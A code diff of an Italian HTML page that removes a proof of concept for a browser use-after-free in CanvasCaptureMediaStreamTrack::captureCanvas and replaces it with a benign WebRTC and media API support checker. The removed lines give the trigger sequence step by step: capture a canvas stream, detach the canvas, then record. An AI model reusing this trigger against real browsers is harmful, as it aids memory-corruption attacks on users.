@@ -2,80 +2,53 @@
 <html lang="it">
 <head>
     <meta charset="UTF-8" />
-    <title>PoC UAF in CanvasCaptureMediaStreamTrack::captureCanvas</title>
-    <style>
-        canvas {
-            border: 2px solid #444;
-            margin-bottom: 20px;
-        }
-        button {
-            padding: 8px 16px;
-            font-size: 16px;
-            margin-bottom: 20px;
-        }
-    </style>
+    <title>WebRTC / MediaStream Checker</title>
 </head>
 <body>
-    <h2>PoC UAF in <code>CanvasCaptureMediaStreamTrack::captureCanvas()</code></h2>
-
-    <button id="startButton">Avvia PoC</button>
-    <canvas id="myCanvas" width="320" height="180"></canvas>
-    <video id="video" autoplay muted playsinline style="display:none;"></video>
+    <h2>Controllo WebRTC / Media APIs</h2>
+    <button id="checkBtn">Verifica Disponibilità</button>
 
     <script>
-        const startBtn = document.getElementById("startButton");
-        const canvas   = document.getElementById("myCanvas");
-        const videoEl  = document.getElementById("video");
+        document.getElementById("checkBtn").addEventListener("click", () => {
+            const rtcSupport = !!(window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection);
+            alert("RTCPeerConnection supportato? " + rtcSupport);
 
-        startBtn.addEventListener("click", () => {
-            startBtn.disabled = true;
-            alert("1) Disegno un rettangolo sul canvas...");
-            const ctx = canvas.getContext("2d");
-            ctx.fillStyle = "#44a";
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            const getUserMediaSupport = !!(navigator.mediaDevices && typeof navigator.mediaDevices.getUserMedia === "function");
+            alert("getUserMedia supportato? " + getUserMediaSupport);
 
-            alert("2) Chiamo canvas.captureStream()...");
-            let stream;
-            try {
-                stream = canvas.captureStream(0);
-            } catch (e) {
-                alert(`❌ captureStream() fallito: ${e}`);
-                return;
+            const mediaRecorderSupport = typeof window.MediaRecorder === "function";
+            alert("MediaRecorder supportato? " + mediaRecorderSupport);
+
+            const testCanvas = document.createElement("canvas");
+            const captureStreamSupport = typeof testCanvas.captureStream === "function";
+            alert("canvas.captureStream() supportato? " + captureStreamSupport);
+
+            const speechRecogSupport = !!(window.SpeechRecognition || window.webkitSpeechRecognition);
+            alert("SpeechRecognition supportato? " + speechRecogSupport);
+
+            if (rtcSupport) {
+                try {
+                    const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)();
+                    alert("RTCPeerConnection creato.");
+                    pc.close();
+                } catch (e) {
+                    alert("Errore creando RTCPeerConnection: " + e.name);
+                }
             }
-            alert("⮕ MediaStream ottenuto.");
-            alert("3) Collego il MediaStream al <video>...");
-            videoEl.srcObject = stream;
-            videoEl.addEventListener("loadeddata", onVideoLoaded);
+
+            if (captureStreamSupport) {
+                const c2 = document.createElement("canvas");
+                alert("Chiamo c2.captureStream()");
+                try {
+                    const ms = c2.captureStream(0);
+                    alert("captureStream ha restituito un MediaStream.");
+                } catch (e) {
+                    alert("captureStream ha fallito: " + e.name);
+                }
+            }
+
+            alert("Controllo completato.");
         });
-
-        function onVideoLoaded() {
-            alert("4) loadeddata ricevuto.");
-            videoEl.removeEventListener("loadeddata", onVideoLoaded);
-            alert("5) Rimuovo <canvas> dal DOM...");
-            canvas.parentNode.removeChild(canvas);
-            setTimeout(triggerFrameCapture, 50);
-        }
-
-        function triggerFrameCapture() {
-            alert("6) Attivo MediaRecorder...");
-            try {
-                const recorder = new MediaRecorder(videoEl.srcObject);
-                recorder.ondataavailable = () => {
-                    alert("   • ondataavailable ricevuto.");
-                };
-                recorder.onerror = e => {
-                    alert(`   ❌ MediaRecorder errore: ${e.error.name}`);
-                };
-                recorder.start();
-                setTimeout(() => {
-                    recorder.stop();
-                    alert("   • Recorder stoppato.");
-                }, 100);
-            } catch (e) {
-                alert(`   ❌ Errore MediaRecorder: ${e.name}`);
-            }
-            alert("Fine test.");
-        }
     </script>
 </body>
 </html>
